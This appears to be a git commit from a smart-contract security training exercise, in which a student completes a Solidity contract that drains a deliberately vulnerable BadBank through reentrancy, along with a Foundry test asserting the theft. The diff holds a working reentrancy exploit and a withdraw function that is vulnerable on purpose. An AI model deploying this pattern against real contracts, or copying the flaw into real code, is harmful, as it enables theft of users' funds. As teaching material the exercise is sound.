acb67db97e0c8f09e60b253d70203462917ba3d9
sigueninni <saad.igueninni@gmail.com>
2025-03-11 05:43:14 +0100

    Week1 - fix NinetyNinePerCent

--- src/BadBank.sol
+++ src/BadBank.sol
@@ -2,15 +2,17 @@
 pragma solidity 0.8.28;
 
 import {Address} from "@openzeppelin/contracts/utils/Address.sol";
+import "forge-std/console.sol";
 
 contract BadBank {
     using Address for address;
     mapping(address => uint256) public balances;
 
     function deposit() public payable {
+        console.log("here", msg.sender);
         balances[msg.sender] += msg.value;
     }
-    
+
     function withdraw() public {
         uint256 balance = balances[msg.sender];
         Address.sendValue(payable(msg.sender), balance);
@@ -24,12 +26,20 @@ contract RobTheBank {
     constructor(address _bank) {
         bank = BadBank(_bank);
     }
-    
+
     function rob() public payable {
         // your code here
+        bank.deposit{value: 1 ether}();
+        bank.withdraw();
     }
 
     receive() external payable {
         // your code here
+        // console.log("bank receive", address(bank).balance);
+        // console.log("this receive", address(this).balance);
+        if (address(bank).balance > 0 ether) {
+            // console.log("bank receive", address(bank).balance);
+            bank.withdraw();
+        }
     }
 }
--- test/BadBank.t.sol
+++ test/BadBank.t.sol
@@ -30,3 +30,50 @@ contract BadBankTest is Test {
         assertEq(address(robberContract).balance, 11 ether);
     }
 }
+
+/* 
+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {BadBank, RobTheBank} from "../src/BadBank.sol";
+import "forge-std/console.sol";
+
+contract BadBankTest is Test {
+    BadBank bank;
+    RobTheBank robberContract;
+
+    address victimWallet = makeAddr("victimWallet");
+
+    address robberWallet = makeAddr("robberWallet");
+
+    function setUp() public {
+        bank = new BadBank();
+        robberContract = new RobTheBank(address(bank));
+
+        vm.deal(victimWallet, 10 ether);
+        vm.deal(robberWallet, 2 ether);
+
+        vm.prank(victimWallet);
+        bank.deposit{value: 10 ether}();
+
+        vm.prank(robberWallet);
+        bank.deposit{value: 1 ether}();
+    }
+
+    function test_RobTheBank() public {
+        console.log("victimWallet", victimWallet);
+        console.log("robberWallet", robberWallet);
+
+        vm.prank(robberWallet);
+        robberContract.rob{value: 1 ether}();
+
+        console.log("bank dans le test           ", address(bank).balance);
+        console.log(
+            "trobberContract dans le test",
+            address(robberContract).balance
+        );
+        assertEq(address(bank).balance, 0);
+        assertEq(address(robberContract).balance, 11 ether);
+    }
+}
+ */
